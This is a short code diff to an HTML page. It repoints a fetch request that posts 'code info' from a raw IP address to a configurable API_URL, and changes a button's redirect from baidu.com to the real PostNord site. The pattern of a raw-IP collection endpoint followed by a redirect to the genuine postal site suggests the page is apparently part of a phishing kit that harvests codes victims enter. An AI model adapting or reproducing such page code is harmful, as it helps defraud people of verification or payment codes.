@@ -8,7 +8,7 @@
   <link rel="stylesheet" href="./css/code2.css" />
   <script src="js/rem.js"></script>
   <script src="https://www.jq22.com/jquery/jquery-1.10.2.js"></script>
-  <script src="./js//websocket.js"></script>
+  <script src="js/websocket.js"></script>
 
   <script>
     // let load = document.querySelector('.loading');
@@ -66,7 +66,7 @@
 
         //发起http请求  
 
-        fetch('https://155.94.182.31:8080user/addCodeInfo', {
+        fetch(API_URL + '/user/addCodeInfo', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -116,7 +116,7 @@
       btn.onclick = function () {
         let flag = true;
         if (flag) {
-          window.location.href = 'https://www.baidu.com/';
+          window.location.href = 'https://www.postnord.dk/';
         }
       };
     </script> -->
